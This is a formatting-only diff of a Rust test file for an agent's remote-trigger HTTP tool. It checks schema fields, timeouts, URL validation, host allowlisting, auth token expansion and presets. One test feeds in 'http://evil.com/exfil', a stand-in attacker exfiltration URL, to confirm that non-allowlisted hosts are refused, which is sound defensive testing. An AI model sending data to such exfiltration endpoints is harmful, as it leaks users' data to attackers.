@@ -7,10 +7,8 @@
 
 #![cfg(feature = "remote-trigger")]
 
-use archon_tools::remote_trigger::{
-    RemoteTriggerConfig, RemoteTriggerTool, TriggerPreset,
-};
-use archon_tools::tool::{PermissionLevel, Tool, ToolContext, AgentMode};
+use archon_tools::remote_trigger::{RemoteTriggerConfig, RemoteTriggerTool, TriggerPreset};
+use archon_tools::tool::{AgentMode, PermissionLevel, Tool, ToolContext};
 use serde_json::json;
 use std::collections::HashMap;
 use std::path::PathBuf;
@@ -64,7 +62,9 @@ fn tool_description_documents_divergence_from_project_zero() {
 fn tool_schema_has_url_field() {
     let tool = RemoteTriggerTool::new(cfg_with_hosts(&["localhost"]));
     let schema = tool.input_schema();
-    let props = schema["properties"].as_object().expect("schema must have properties");
+    let props = schema["properties"]
+        .as_object()
+        .expect("schema must have properties");
     assert!(props.contains_key("url"), "schema must have 'url' field");
 }
 
@@ -73,7 +73,10 @@ fn tool_schema_has_payload_field() {
     let tool = RemoteTriggerTool::new(cfg_with_hosts(&["localhost"]));
     let schema = tool.input_schema();
     let props = schema["properties"].as_object().unwrap();
-    assert!(props.contains_key("payload"), "schema must have 'payload' field");
+    assert!(
+        props.contains_key("payload"),
+        "schema must have 'payload' field"
+    );
 }
 
 #[test]
@@ -81,7 +84,10 @@ fn tool_schema_has_optional_preset_field() {
     let tool = RemoteTriggerTool::new(cfg_with_hosts(&["localhost"]));
     let schema = tool.input_schema();
     let props = schema["properties"].as_object().unwrap();
-    assert!(props.contains_key("preset"), "schema must have 'preset' field");
+    assert!(
+        props.contains_key("preset"),
+        "schema must have 'preset' field"
+    );
 }
 
 #[test]
@@ -89,7 +95,10 @@ fn tool_schema_has_optional_timeout_field() {
     let tool = RemoteTriggerTool::new(cfg_with_hosts(&["localhost"]));
     let schema = tool.input_schema();
     let props = schema["properties"].as_object().unwrap();
-    assert!(props.contains_key("timeout_secs"), "schema must have 'timeout_secs' field");
+    assert!(
+        props.contains_key("timeout_secs"),
+        "schema must have 'timeout_secs' field"
+    );
 }
 
 #[test]
@@ -119,7 +128,11 @@ fn config_max_timeout_is_120s() {
 #[test]
 fn config_max_response_is_100kb() {
     let cfg = RemoteTriggerConfig::default();
-    assert_eq!(cfg.max_response_bytes, 100 * 1024, "max response must be 100KB");
+    assert_eq!(
+        cfg.max_response_bytes,
+        100 * 1024,
+        "max response must be 100KB"
+    );
 }
 
 // ---------------------------------------------------------------------------
@@ -129,14 +142,17 @@ fn config_max_response_is_100kb() {
 #[tokio::test]
 async fn non_allowlisted_host_rejected_without_network_call() {
     let tool = RemoteTriggerTool::new(cfg_with_hosts(&["localhost"]));
-    let result = tool.execute(
-        json!({"url": "http://evil.com/exfil", "payload": {}}),
-        &ctx(),
-    ).await;
+    let result = tool
+        .execute(
+            json!({"url": "http://evil.com/exfil", "payload": {}}),
+            &ctx(),
+        )
+        .await;
     assert!(result.is_error, "non-allowlisted host must be rejected");
     assert!(
         result.content.contains("not allowed") || result.content.contains("allowlist"),
-        "error must mention allowlist: got {:?}", result.content
+        "error must mention allowlist: got {:?}",
+        result.content
     );
 }
 
@@ -150,17 +166,18 @@ async fn missing_url_returns_validation_error() {
 #[tokio::test]
 async fn empty_url_returns_validation_error() {
     let tool = RemoteTriggerTool::new(cfg_with_hosts(&["localhost"]));
-    let result = tool.execute(json!({"url": "", "payload": {}}), &ctx()).await;
+    let result = tool
+        .execute(json!({"url": "", "payload": {}}), &ctx())
+        .await;
     assert!(result.is_error, "empty url must return error");
 }
 
 #[tokio::test]
 async fn invalid_url_returns_validation_error() {
     let tool = RemoteTriggerTool::new(cfg_with_hosts(&["localhost"]));
-    let result = tool.execute(
-        json!({"url": "not-a-url", "payload": {}}),
-        &ctx(),
-    ).await;
+    let result = tool
+        .execute(json!({"url": "not-a-url", "payload": {}}), &ctx())
+        .await;
     assert!(result.is_error, "invalid url must return error");
 }
 
@@ -170,15 +187,18 @@ async fn https_allowed_host_passes_allowlist_check() {
     let tool = RemoteTriggerTool::new(cfg_with_hosts(&["secure.example.com"]));
     // We don't make a real request — we just verify the allowlist check passes
     // by checking the error message is not about allowlist
-    let result = tool.execute(
-        json!({"url": "https://secure.example.com/trigger", "payload": {}}),
-        &ctx(),
-    ).await;
+    let result = tool
+        .execute(
+            json!({"url": "https://secure.example.com/trigger", "payload": {}}),
+            &ctx(),
+        )
+        .await;
     // Will fail with connection error (not allowlist error) — that's fine
     if result.is_error {
         assert!(
             !result.content.contains("allowlist") && !result.content.contains("not allowed"),
-            "allowed host should not be rejected by allowlist: {:?}", result.content
+            "allowed host should not be rejected by allowlist: {:?}",
+            result.content
         );
     }
 }
@@ -233,16 +253,22 @@ fn small_response_not_truncated() {
 
 #[test]
 fn env_var_expansion_in_auth() {
-    unsafe { std::env::set_var("TEST_ARCHON_TOKEN", "secret-abc-123"); }
+    unsafe {
+        std::env::set_var("TEST_ARCHON_TOKEN", "secret-abc-123");
+    }
     let expanded = RemoteTriggerTool::expand_env_vars("Bearer ${TEST_ARCHON_TOKEN}");
     assert_eq!(expanded, "Bearer secret-abc-123");
-    unsafe { std::env::remove_var("TEST_ARCHON_TOKEN"); }
+    unsafe {
+        std::env::remove_var("TEST_ARCHON_TOKEN");
+    }
 }
 
 #[test]
 fn env_var_expansion_missing_var_uses_empty() {
     // Unset var should expand to empty string without panic
-    unsafe { std::env::remove_var("DEFINITELY_NOT_SET_ARCHON_TEST"); }
+    unsafe {
+        std::env::remove_var("DEFINITELY_NOT_SET_ARCHON_TEST");
+    }
     let expanded = RemoteTriggerTool::expand_env_vars("Bearer ${DEFINITELY_NOT_SET_ARCHON_TEST}");
     // Should not panic; value is empty or original placeholder
     let _ = expanded;
@@ -261,10 +287,13 @@ fn no_env_var_placeholder_unchanged() {
 #[test]
 fn preset_resolves_url_and_auth() {
     let mut presets = HashMap::new();
-    presets.insert("staging".to_string(), TriggerPreset {
-        url: "https://staging.example.com/trigger".into(),
-        auth: Some("Bearer token123".into()),
-    });
+    presets.insert(
+        "staging".to_string(),
+        TriggerPreset {
+            url: "https://staging.example.com/trigger".into(),
+            auth: Some("Bearer token123".into()),
+        },
+    );
     let cfg = RemoteTriggerConfig {
         allowed_hosts: vec!["staging.example.com".into()],
         presets,
